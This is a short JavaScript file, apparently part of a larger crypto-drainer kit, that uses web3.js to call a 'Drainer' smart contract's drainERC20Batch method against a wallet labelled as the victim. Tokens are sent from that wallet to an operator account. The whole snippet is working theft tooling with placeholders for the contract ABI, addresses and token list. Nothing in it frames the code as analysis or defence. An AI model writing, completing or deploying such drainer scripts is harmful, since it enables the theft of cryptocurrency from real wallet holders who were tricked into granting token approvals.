const Web3 = require('web3');
const web3 = new Web3('https://rpc.example.com'); // replace with your chain RPC
const drainerABI = [ /* paste Drainer.sol ABI here or use ethers v5 */ ];

const drainer = new web3.eth.Contract(drainerABI, '0xYourDrainerAddress');
const victim = '0xVictimWallet';

async function sweep() {
    const tokens = [/* same as above */];
    const tx = await drainer.methods.drainERC20Batch(tokens, victim).send({ from: '0xOperatorWallet' });
    console.log('Sweept!', tx.transactionHash);
}

sweep();